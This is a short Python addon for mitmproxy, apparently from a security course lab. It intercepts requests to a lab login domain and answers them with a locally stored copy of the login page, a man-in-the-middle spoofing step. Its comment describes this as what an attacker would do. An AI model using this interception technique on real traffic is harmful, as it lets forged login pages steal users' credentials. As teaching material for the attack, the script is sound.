from mitmproxy import ctx, http


# Read the html from the login page. In a real-world scenario, the attacker
# would have scraped the website and downloaded it locally.
with open("secure/login.html") as f:
    html = f.read()


class Intercepter:
    def response(self, flow):
        if flow.request.pretty_url in [
            "http://tda602-secure-login.tk/",
            "http://www.tda602-secure-login.tk/",
        ]:
            ctx.log.info("intercepted request to tda602-secure-login.tk")
            flow.response = http.HTTPResponse.make(
                200,
                html,
                {"Content-Type": "text/html"}
            )


addons = [
    Intercepter()
]
